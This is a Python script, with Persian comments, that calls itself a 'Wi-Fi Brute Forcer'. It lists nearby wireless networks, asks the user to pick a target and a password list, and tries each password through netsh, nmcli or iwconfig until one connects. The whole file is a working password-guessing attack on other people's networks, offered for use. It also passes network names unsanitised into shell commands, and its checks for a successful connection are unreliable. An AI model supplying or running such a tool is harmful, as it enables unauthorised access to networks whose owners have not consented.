import subprocess
import sys
import re
import os
import platform

def scan_networks():
    """اسکن شبکه‌های وای‌فای و برگشت SSIDها"""
    print("Scanning for Wi-Fi networks...")
    networks = []
    
    # شناسایی سیستم‌عامل
    if platform.system() == "Windows":
        result = subprocess.run(['netsh', 'wlan', 'show', 'network'], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            match = re.search(r'^\s*SSID\s*:\s*(.+)', line)
            if match:
                networks.append(match.group(1).strip())
    elif platform.system() == "Linux":
        result = subprocess.run(['nmcli', '-t', '-f', 'SSID', 'dev', 'wifi'], capture_output=True, text=True)
        networks = result.stdout.strip().splitlines()
    elif 'ANDROID_ROOT' in os.environ:  # شناسایی نوعی از اجرای Termux
        try:
            result = subprocess.run(['iwlist', 'wlan0', 'scan'], capture_output=True, text=True)
            for line in result.stdout.splitlines():
                match = re.search(r'ESSID:"(.+)"', line)
                if match:
                    networks.append(match.group(1).strip())
        except FileNotFoundError:
            print("Error: 'iwlist' command is not found. Please install it in Termux.")
            sys.exit(1)
    else:
        print("Unsupported OS")
        sys.exit(1)

    return networks

def try_password(ssid, password):
    """تلاش برای اتصال به شبکه وای‌فای با یک پسورد مشخص"""
    print(f"Trying password: {password}")

    if platform.system() == "Windows":
        # ایجاد یک فایل موقت برای تنظیمات اتصال در ویندوز
        config = f"""
        netsh wlan add profile filename="{ssid}.xml"
        """

        with open(f"{ssid}.xml", 'w') as f:
            f.write(f"""
            <WLANProfile xmlns="http://www.microsoft.com/windows/ssid">
              <name>{ssid}</name>
              <SSIDConfig>
                <SSID>{ssid}</SSID>
              </SSIDConfig>
              <connectionType>ESS</connectionType>
              <connectionMode>auto</connectionMode>
              <security>
                <keyManagement>wpa-psk</keyManagement>
                <sharedKey>
                  <keyType>passPhrase</keyType>
                  <key>{password}</key>
                </sharedKey>
              </security>
            </WLANProfile>
            """)

        subprocess.run(config, shell=True)
        connection_command = f'netsh wlan connect name={ssid}'

        result = subprocess.run(connection_command, shell=True, capture_output=True, text=True)

        if "successfully" in result.stdout:
            print(f"Password found: {password}")
            return True

    elif platform.system() == "Linux":
        # اتصال به شبکه وای‌فای با استفاده از nmcli
        connection_command = ['nmcli', 'dev', 'wifi', 'connect', ssid, 'password', password]
        result = subprocess.run(connection_command, capture_output=True, text=True)

        if "successfully" in result.stdout:
            print(f"Password found: {password}")
            return True

    elif 'ANDROID_ROOT' in os.environ:  # شناسایی نوعی از اجرای Termux
        connection_command = ['iwconfig', 'wlan0', 'essid', ssid, 'key', password]
        result = subprocess.run(connection_command, capture_output=True, text=True)

        if "successful" in result.stdout or "join" in result.stdout:
            print(f"Password found: {password}")
            return True

    return False

def brute_force(ssid, dictionary_file):
    """تلاش برای پیدا کردن پسورد با استفاده از دیکشنری"""
    with open(dictionary_file, 'r') as file:
        for line in file:
            password = line.strip()
            if try_password(ssid, password):
                return password
    print("Password not found in the dictionary.")
    return None

# Main execution
if __name__ == "__main__":
    print("Welcome to Wi-Fi Brute Forcer")

    networks = scan_networks()

    if not networks:
        print("No Wi-Fi networks found.")
        sys.exit(1)

    print("Available networks:")
    for i, network in enumerate(networks, start=1):
        print(f"{i}. {network}")

    # انتخاب SSID
    choice = int(input("Select the network number you want to target: ")) - 1
    ssid = networks[choice]

    # وارد کردن آدرس فایل دیکشنری
    dictionary_file = input("Enter the path to your password list: ")

    brute_force(ssid, dictionary_file)

